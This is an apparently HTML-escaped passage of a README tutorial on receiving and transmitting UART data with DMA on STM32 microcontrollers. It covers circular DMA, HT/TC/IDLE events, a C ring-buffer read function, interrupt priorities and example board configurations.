&lt;em&gt;circular&lt;/em&gt; mode, these interrupts are triggered periodically&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Number of elements to transfer by DMA hardware must be written to relevant DMA register before start of transfer&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;Combine UART + DMA for data reception&lt;/h3&gt; &#xA;&lt;p&gt;Now it is time to understand which features to use to receive data with UART and DMA to offload CPU. As for the sake of this example, we use memory buffer array of &lt;code&gt;20&lt;/code&gt; bytes. DMA will transfer data received from UART to this buffer.&lt;/p&gt; &#xA;&lt;p&gt;Listed are steps to begin. Initial assumption is that UART has been initialized prior reaching this step, same for basic DMA setup, the rest:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Application writes &lt;code&gt;20&lt;/code&gt; to relevant DMA register for data length&lt;/li&gt; &#xA; &lt;li&gt;Application writes memory &amp;amp; peripheral addresses to relevant DMA registers&lt;/li&gt; &#xA; &lt;li&gt;Application sets DMA direction to &lt;em&gt;peripheral-to-memory&lt;/em&gt; mode&lt;/li&gt; &#xA; &lt;li&gt;Application puts DMA to &lt;em&gt;circular&lt;/em&gt; mode. This is to assure DMA does not stop transferring data after it reaches end of memory. Instead, it will roll over and continue with transferring possible more data from UART to memory&lt;/li&gt; &#xA; &lt;li&gt;Application enables DMA &amp;amp; UART in reception mode. Receive can not start &amp;amp; DMA will wait UART to receive first character and transmit it to array. This is done for every received byte&lt;/li&gt; &#xA; &lt;li&gt;Application is notified by DMA &lt;code&gt;HT&lt;/code&gt; event (or interrupt) after first &lt;code&gt;10&lt;/code&gt; have been transferred from UART to memory&lt;/li&gt; &#xA; &lt;li&gt;Application is notified by DMA &lt;code&gt;TC&lt;/code&gt; event (or interrupt) after &lt;code&gt;20&lt;/code&gt; bytes are transferred from UART to memory&lt;/li&gt; &#xA; &lt;li&gt;Application is notified by UART IDLE line (or RTO) in case of IDLE line or timeout detected on RX line&lt;/li&gt; &#xA; &lt;li&gt;Application needs to reach on all of these events for most efficient receive&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;This configuration is important as we do not know length in advance. Application needs to assume it may be endless number of bytes received, therefore DMA must be operational endlessly.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;We have used &lt;code&gt;20&lt;/code&gt; bytes long array for demonstration purposes. In real app this size may need to be increased. It all depends on UART baudrate (higher speed, more data may be received in fixed window) and how fast application can process the received data (either using interrupt notification, RTOS, or polling mode)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;Combine UART + DMA for data transmission&lt;/h3&gt; &#xA;&lt;p&gt;Everything gets simplier when application transmits data, length of data is known in advance and memory to transmit is ready. For the sake of this example, we use memory for &lt;code&gt;Helloworld&lt;/code&gt; message. In &lt;em&gt;C language&lt;/em&gt; it would be:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;const char&#xA;hello_world_arr[] = &#34;HelloWorld&#34;;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Application writes number of bytes to transmit to relevant DMA register, that would be &lt;code&gt;strlen(hello_world_arr)&lt;/code&gt; or &lt;code&gt;10&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Application writes memory &amp;amp; peripheral addresses to relevant DMA registers&lt;/li&gt; &#xA; &lt;li&gt;Application sets DMA direction to &lt;em&gt;memory-to-peripheral&lt;/em&gt; mode&lt;/li&gt; &#xA; &lt;li&gt;Application sets DMA to &lt;em&gt;normal&lt;/em&gt; mode. This effectively disables DMA once all the bytes are successfully transferred&lt;/li&gt; &#xA; &lt;li&gt;Application enables DMA &amp;amp; UART in transmitter mode. Transmit starts immediately when UART requests first byte via DMA to be shifted to UART TX register&lt;/li&gt; &#xA; &lt;li&gt;Application is notified by &lt;code&gt;TC&lt;/code&gt; event (or interrupt) after all bytes have been transmitted from memory to UART via DMA&lt;/li&gt; &#xA; &lt;li&gt;DMA is stopped and application may prepare next transfer immediately&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Please note that &lt;code&gt;TC&lt;/code&gt; event is triggered before last UART byte has been fully transmitted over UART. That&#39;s because &lt;code&gt;TC&lt;/code&gt; event is part of DMA and not part of UART. It is triggered when DMA transfers all the bytes from point &lt;em&gt;A&lt;/em&gt; to point &lt;em&gt;B&lt;/em&gt;. That is, point &lt;em&gt;A&lt;/em&gt; for DMA is memory, point &lt;em&gt;B&lt;/em&gt; is UART data register. Now it is up to UART to clock out byte to GPIO pin&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;DMA HT/TC and UART IDLE combination details&lt;/h3&gt; &#xA;&lt;p&gt;This section describes &lt;code&gt;4&lt;/code&gt; possible cases and one additional which explains why &lt;em&gt;HT/TC&lt;/em&gt; events are necessary by application&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/MaJerle/stm32-usart-uart-dma-rx-tx/master/docs/dma_events.svg?sanitize=true&#34; alt=&#34;DMA events&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Abbrevations used for the image:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;R&lt;/code&gt;: &lt;code&gt;R&lt;/code&gt;ead pointer, used by application to read data from memory. Later also used as &lt;code&gt;old_ptr&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;W&lt;/code&gt;: &lt;code&gt;W&lt;/code&gt;rite pointer, used by DMA to write next byte to. Increased every time DMA writes new byte. Later also used as &lt;code&gt;new_ptr&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;HT&lt;/code&gt;: &lt;code&gt;H&lt;/code&gt;alf-&lt;code&gt;T&lt;/code&gt;ransfer Complete event triggered by DMA&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;TC&lt;/code&gt;: &lt;code&gt;T&lt;/code&gt;ransfer-&lt;code&gt;C&lt;/code&gt;omplete event - triggered by DMA&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;I&lt;/code&gt;: &lt;code&gt;I&lt;/code&gt;DLE line event - triggered by USART&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;DMA configuration:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Circular mode&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;20&lt;/code&gt; bytes data length &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Consequently &lt;code&gt;HT&lt;/code&gt; event gets triggered at &lt;code&gt;10&lt;/code&gt; bytes being transmitted&lt;/li&gt; &#xA;   &lt;li&gt;Consequently &lt;code&gt;TC&lt;/code&gt; event gets triggered at &lt;code&gt;20&lt;/code&gt; bytes being transmitted&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Possible cases during real-life execution:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Case &lt;em&gt;A&lt;/em&gt;: DMA transfers &lt;code&gt;10&lt;/code&gt; bytes. Application gets notification with &lt;code&gt;HT&lt;/code&gt; event and may process received data&lt;/li&gt; &#xA; &lt;li&gt;Case &lt;em&gt;B&lt;/em&gt;: DMA transfers next &lt;code&gt;10&lt;/code&gt; bytes. Application gets notification thanks to &lt;code&gt;TC&lt;/code&gt; event. Processing now starts from last known position until the end of memory &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;DMA is in circular mode, thus it will continue right from beginning of the buffer, on top of the picture&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Case &lt;em&gt;C&lt;/em&gt;: DMA transfers &lt;code&gt;10&lt;/code&gt; bytes, but not aligned with &lt;code&gt;HT&lt;/code&gt; nor &lt;code&gt;TC&lt;/code&gt; events &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Application gets notified with &lt;code&gt;HT&lt;/code&gt; event when first &lt;code&gt;6&lt;/code&gt; bytes are transfered. Processing may start from last known read location&lt;/li&gt; &#xA;   &lt;li&gt;Application receives &lt;code&gt;IDLE&lt;/code&gt; line event after next &lt;code&gt;4&lt;/code&gt; bytes are successfully transfered to memory&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Case &lt;em&gt;D&lt;/em&gt;: DMA transfers &lt;code&gt;10&lt;/code&gt; bytes in &lt;em&gt;overflow&lt;/em&gt; mode and but not aligned with &lt;code&gt;HT&lt;/code&gt; nor &lt;code&gt;TC&lt;/code&gt; events &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Application gets notification by &lt;code&gt;TC&lt;/code&gt; event when first &lt;code&gt;4&lt;/code&gt; bytes are transfered. Processing may start from last known read location&lt;/li&gt; &#xA;   &lt;li&gt;Application gets notification by &lt;code&gt;IDLE&lt;/code&gt; event after next &lt;code&gt;6&lt;/code&gt; bytes are transfered. Processing may start from beginning of buffer&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Case &lt;em&gt;E&lt;/em&gt;: Example what may happen when application relies only on &lt;code&gt;IDLE&lt;/code&gt; event &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;If application receives &lt;code&gt;30&lt;/code&gt; bytes in burst, &lt;code&gt;10&lt;/code&gt; bytes get overwritten by DMA as application did not process it quickly enough&lt;/li&gt; &#xA;   &lt;li&gt;Application gets &lt;code&gt;IDLE&lt;/code&gt; line event once there is steady RX line for &lt;code&gt;1&lt;/code&gt; byte timeframe&lt;/li&gt; &#xA;   &lt;li&gt;Red part of data represents first &lt;code&gt;10&lt;/code&gt; received bytes from burst which were overwritten by last &lt;code&gt;10&lt;/code&gt; bytes in burst&lt;/li&gt; &#xA;   &lt;li&gt;Option to avoid such scenario is to poll for DMA changes quicker than burst of &lt;code&gt;20&lt;/code&gt; bytes take; or by using &lt;code&gt;TC&lt;/code&gt; and &lt;code&gt;HT&lt;/code&gt; events&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Example code to read data from memory and process it, for cases &lt;em&gt;A-D&lt;/em&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/**&#xA; * \brief           Check for new data received with DMA&#xA; *&#xA; * User must select context to call this function from:&#xA; * - Only interrupts (DMA HT, DMA TC, UART IDLE) with same preemption priority level&#xA; * - Only thread context (outside interrupts)&#xA; *&#xA; * If called from both context-es, exclusive access protection must be implemented&#xA; * This mode is not advised as it usually means architecture design problems&#xA; *&#xA; * When IDLE interrupt is not present, application must rely only on thread context,&#xA; * by manually calling function as quickly as possible, to make sure&#xA; * data are read from raw buffer and processed.&#xA; *&#xA; * Not doing reads fast enough may cause DMA to overflow unread received bytes,&#xA; * hence application will lost useful data.&#xA; *&#xA; * Solutions to this are:&#xA; * - Improve architecture design to achieve faster reads&#xA; * - Increase raw buffer size and allow DMA to write more data before this function is called&#xA; */&#xA;void&#xA;usart_rx_check(void) {&#xA;    /*&#xA;     * Set old position variable as static.&#xA;     *&#xA;     * Linker should (with default C configuration) set this variable to `0`.&#xA;     * It is used to keep latest read start position,&#xA;     * transforming this function to not being reentrant or thread-safe&#xA;     */&#xA;    static size_t old_pos;&#xA;    size_t pos;&#xA;&#xA;    /* Calculate current position in buffer and check for new data available */&#xA;    pos = ARRAY_LEN(usart_rx_dma_buffer) - LL_DMA_GetDataLength(DMA1, LL_DMA_CHANNEL_5);&#xA;    if (pos != old_pos) {                       /* Check change in received data */&#xA;        if (pos &amp;gt; old_pos) {                    /* Current position is over previous one */&#xA;            /*&#xA;             * Processing is done in &#34;linear&#34; mode.&#xA;             *&#xA;             * Application processing is fast with single data block,&#xA;             * length is simply calculated by subtracting pointers&#xA;             *&#xA;             * [   0   ]&#xA;             * [   1   ] &amp;lt;- old_pos |------------------------------------|&#xA;             * [   2   ]            |                                    |&#xA;             * [   3   ]            | Single block (len = pos - old_pos) |&#xA;             * [   4   ]            |                                    |&#xA;             * [   5   ]            |------------------------------------|&#xA;             * [   6   ] &amp;lt;- pos&#xA;             * [   7   ]&#xA;             * [ N - 1 ]&#xA;             */&#xA;            usart_process_data(&amp;amp;usart_rx_dma_buffer[old_pos], pos - old_pos);&#xA;        } else {&#xA;            /*&#xA;             * Processing is done in &#34;overflow&#34; mode..&#xA;             *&#xA;             * Application must process data twice,&#xA;             * since there are 2 linear memory blocks to handle&#xA;             *&#xA;             * [   0   ]            |---------------------------------|&#xA;             * [   1   ]            | Second block (len = pos)        |&#xA;             * [   2   ]            |---------------------------------|&#xA;             * [   3   ] &amp;lt;- pos&#xA;             * [   4   ] &amp;lt;- old_pos |---------------------------------|&#xA;             * [   5   ]            |                                 |&#xA;             * [   6   ]            | First block (len = N - old_pos) |&#xA;             * [   7   ]            |                                 |&#xA;             * [ N - 1 ]            |---------------------------------|&#xA;             */&#xA;            usart_process_data(&amp;amp;usart_rx_dma_buffer[old_pos], ARRAY_LEN(usart_rx_dma_buffer) - old_pos);&#xA;            if (pos &amp;gt; 0) {&#xA;                usart_process_data(&amp;amp;usart_rx_dma_buffer[0], pos);&#xA;            }&#xA;        }&#xA;        old_pos = pos;                          /* Save current position as old for next transfers */&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Interrupt priorities are important&lt;/h3&gt; &#xA;&lt;p&gt;Thanks to Cortex-M NVIC&#39;s (Nested Vectored Interrupt Controller) flexibility, user can configure priority level for each of the NVIC interrupt lines; it has full control over execution profile for each of the interrupt lines separately.&lt;/p&gt; &#xA;&lt;p&gt;There are &lt;code&gt;2&lt;/code&gt; priority types in Cortex-M:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Preemption priority: Interrupt with higher logical priority level can preempt already running lower priority interrupt&lt;/li&gt; &#xA; &lt;li&gt;Subpriority: Interrupt with higher subpriority (but same preemption priority) will execute first when &lt;code&gt;2&lt;/code&gt; (or more) interrupt lines become active at the same time; such interrupt will also never stop currently executed interrupt (if any) by the CPU.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;STM32s have different interrupt lines (interrupt service routines later too) for DMA and UART, one for each peripheral and its priority could be software configurable.&lt;/p&gt; &#xA;&lt;p&gt;Function that gets called to process received data must keep position of &lt;em&gt;last read value&lt;/em&gt;, hence processing function is not thread-safe or reentrant and requires special attention.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Application must assure, DMA and UART interrupts utilize same preemption priority level. This is the only configuration to guarantee processing function never gets preempted by itself (DMA interrupt to preempty UART, or opposite), otherwise last-known read position may get corrupted and application will operate with wrong data.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;Examples&lt;/h1&gt; &#xA;&lt;p&gt;Examples can be used as reference code to implement your own DMA TX and RX functionality.&lt;/p&gt; &#xA;&lt;p&gt;There are 2 sets of examples:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Examples for RX only &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Available in &lt;code&gt;projects&lt;/code&gt; folder with &lt;code&gt;usart_rx_&lt;/code&gt; prefix&lt;/li&gt; &#xA;   &lt;li&gt;DMA is used to receive data, polling is used to echo data back&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Examples for RX &amp;amp; TX &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;DMA is used to receive data and to transmit data back&lt;/li&gt; &#xA;   &lt;li&gt;It uses ring buffer to copy data from DMA buffer to application before it is sent back&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Common for all examples:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Developed in &lt;a href=&#34;https://www.st.com/en/development-tools/stm32cubeide.html&#34;&gt;STM32CubeIDE&lt;/a&gt; for easier evaluation on STM32 boards&lt;/li&gt; &#xA; &lt;li&gt;Fully developed using LL drivers for various STM32 families&lt;/li&gt; &#xA; &lt;li&gt;UART common configuration: &lt;code&gt;115200&lt;/code&gt; bauds, &lt;code&gt;1&lt;/code&gt; stop bit, no-parity&lt;/li&gt; &#xA; &lt;li&gt;DMA RX common configuration: Circular mode, &lt;code&gt;TC&lt;/code&gt; and &lt;code&gt;HT&lt;/code&gt; events enabled&lt;/li&gt; &#xA; &lt;li&gt;DMA TX common configuration: Normal mode, &lt;code&gt;TC&lt;/code&gt; event enabled&lt;/li&gt; &#xA; &lt;li&gt;All RX examples implement loop-back functionality. Every character received by UART and transfered by DMA is sent back to same UART&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;STM32 family&lt;/th&gt; &#xA;   &lt;th&gt;Board name&lt;/th&gt; &#xA;   &lt;th&gt;USART&lt;/th&gt; &#xA;   &lt;th&gt;STM32 TX&lt;/th&gt; &#xA;   &lt;th&gt;STM32 RX&lt;/th&gt; &#xA;   &lt;th&gt;RX DMA settings&lt;/th&gt; &#xA;   &lt;th&gt;TX DMA settings&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;STM32F1xx&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;BluePill-F103C8&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;USART1&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PA9&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PA10&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;&lt;code&gt;DMA1&lt;/code&gt;, &lt;code&gt;Channel 5&lt;/code&gt;&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;STM32F4xx&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;NUCLEO-F413ZH&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;USART3&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PD8&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PD9&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;&lt;code&gt;DMA1&lt;/code&gt;, &lt;code&gt;Stream 1&lt;/code&gt;, &lt;code&gt;Channel 4&lt;/code&gt;&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;&lt;code&gt;DMA1&lt;/code&gt;, &lt;code&gt;Stream 3&lt;/code&gt;, &lt;code&gt;Channel 4&lt;/code&gt;&lt;/em&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;STM32G0xx&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;NUCLEO-G071RB&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;USART2&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PA2&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PA3&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;&lt;code&gt;DMA1&lt;/code&gt;, &lt;code&gt;Channel 1&lt;/code&gt;&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;STM32G4xx&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;NUCLEO-G474RE&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;LPUART1&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PA2&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PA3&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;&lt;code&gt;DMA1&lt;/code&gt;, &lt;code&gt;Channel 1&lt;/code&gt;&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;STM32L4xx&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;NUCLEO-L432KC&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;USART2&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PA2&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PA15&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;&lt;code&gt;DMA1&lt;/code&gt;, &lt;code&gt;Channel 6&lt;/code&gt;, &lt;code&gt;Request 2&lt;/code&gt;&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;STM32H7xx&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;NUCLEO-H743ZI2*&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;USART3&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PD8&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PD9&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;&lt;code&gt;DMA1&lt;/code&gt;, &lt;code&gt;Stream 0&lt;/code&gt;&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;&lt;code&gt;DMA1&lt;/code&gt;, &lt;code&gt;Stream 1&lt;/code&gt;&lt;/em&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;STM32U5xx&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;NUCLEO-U575ZI-Q*&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;USART1&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PA9&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;PA10&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;&lt;code&gt;GPDMA1&lt;/code&gt;, &lt;code&gt;Channel 0&lt;/code&gt;&lt;/em&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;em&gt;&lt;code&gt;GPDMA1&lt;/code&gt;, &lt;code&gt;Channel 1&lt;/code&gt;&lt;/em&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;It is possible to run H743 (single-core) examples on dual-core STM32H7 Nucleo boards, NUCLEO-H745 or NUCLEO-H755. Special care needs to be taken as dual-core H7 Nucleo boards use DCDC for MCU power hence application must check clock configuration in main file and uncomment code to enable SMPS.&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Examples demonstrate different use cases for RX only or RX&amp;amp;TX combined.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Demos part of this repository are all based on Low-Level (LL) drivers to maximize user understanding - how to convert theory into practice. Some STM32Cube firmware packages include same example using HAL drivers too. Some of them are (with link to example; list is not exhausted) listed below. All examples are identified as &lt;em&gt;UART_ReceptionToIdle_CircularDMA&lt;/em&gt; - you can search for it in your local Cube firmware repository.&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/STMicroelectronics/STM32CubeU5/tree/main/Projects/NUCLEO-U575ZI-Q/Examples/UART/UART_ReceptionToIdle_CircularDMA&#34;&gt;STM32U5 UART_ReceptionToIdle_CircularDMA&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/STMicroelectronics/STM32CubeL5/tree/master/Projects/NUCLEO-L552ZE-Q/Examples/UART/UART_ReceptionToIdle_CircularDMA&#34;&gt;STM32L5 UART_ReceptionToIdle_CircularDMA&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/STMicroelectronics/STM32CubeG4/tree/master/Projects/NUCLEO-G474RE/Examples/UART/UART_ReceptionToIdle_CircularDMA&#34;&gt;STM32G4 UART_ReceptionToIdle_CircularDMA&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/STMicroelectronics/STM32CubeF4/tree/master/Projects/STM32446E-Nucleo/Examples/UART/UART_ReceptionToIdle_CircularDMA&#34;&gt;STM32F4 UART_ReceptionToIdle_CircularDMA&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/STMicroelectronics/STM32CubeG0/tree/master/Projects/STM32G0C1E-EV/Examples/UART/UART_ReceptionToIdle_CircularDMA&#34;&gt;STM32G0 UART_ReceptionToIdle_CircularDMA&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/STMicroelectronics/STM32CubeL4/tree/master/Projects/NUCLEO-L476RG/Examples/UART/UART_ReceptionToIdle_CircularDMA&#34;&gt;STM32L4 UART_ReceptionToIdle_CircularDMA&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/STMicroelectronics/STM32CubeWB/tree/master/Projects/P-NUCLEO-WB55.Nucleo/Examples/UART/UART_ReceptionToIdle_CircularDMA&#34;&gt;STM32WB UART_ReceptionToIdle_CircularDMA&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/STMicroelectronics/STM32CubeWL/tree/main/Projects/NUCLEO-WL55JC/Examples/UART/UART_ReceptionToIdle_CircularDMA&#34;&gt;STM32WL UART_ReceptionToIdle_CircularDMA&lt;/a&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Examples for UART + DMA RX&lt;/h2&gt; &#xA;&lt;h3&gt;Polling for changes&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;DMA hardware takes care to transfer received data to memory&lt;/li&gt; &#xA; &lt;li&gt;Application must constantly poll for new changes in DMA registers and read received data quick enough to make sure DMA will not overwrite data in buffer&lt;/li&gt; &#xA; &lt;li&gt;Processing of received data is in thread mode (not in interrupt)&lt;/li&gt; &#xA; &lt;li&gt;P: Easy to implement&lt;/li&gt; &#xA; &lt;li&gt;P: No interrupts, no consideration of priority and race conditions&lt;/li&gt; &#xA; &lt;li&gt;P: Fits for devices without &lt;em&gt;USART IDLE&lt;/em&gt; line detection&lt;/li&gt; &#xA; &lt;li&gt;C: Application takes care of data periodically&lt;/li&gt; &#xA; &lt;li&gt;C: Not possible to put application to low-power mode (sleep mode)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Polling for changes with operating system&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Same as polling for changes but with dedicated thread in operating system to process data&lt;/li&gt; &#xA; &lt;li&gt;P: Easy to implement to RTOS systems, uses single thread without additional RTOS features (no mutexes, semaphores, memory queues)&lt;/li&gt; &#xA; &lt;li&gt;P: No interrupts, no consideration of priority and race conditions&lt;/li&gt; &#xA; &lt;li&gt;P: Data processing always &lt;em&gt;on-time&lt;/em&gt; with maximum delay given by thread delay, thus with known maximum latency between received character and processed time &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Unless system has higher priority threads&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;P: Fits for devices without &lt;em&gt;UART IDLE&lt;/em&gt; line detection&lt;/li&gt; &#xA; &lt;li&gt;C: Application takes care of data periodically&lt;/li&gt; &#xA; &lt;li&gt;C: Uses memory resources dedicated for separate thread for data processing&lt;/li&gt; &#xA; &lt;li&gt;C: Not possible to put application to low-power mode (sleep mode)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;UART IDLE line detection + DMA HT&amp;amp;TC interrupts&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Application gets notification by IDLE line detection or DMA TC/HT events&lt;/li&gt; &#xA; &lt;li&gt;Application has to process data only when it receives any of the &lt;code&gt;3&lt;/code&gt; interrupts&lt;/li&gt; &#xA; &lt;li&gt;P: Application does not need to poll for new changes&lt;/li&gt; &#xA; &lt;li&gt;P: Application receives interrupts on events&lt;/li&gt; &#xA; &lt;li&gt;P: Application may enter low-power modes to increase battery life (if operated on battery)&lt;/li&gt; &#xA; &lt;li&gt;C: Data are read 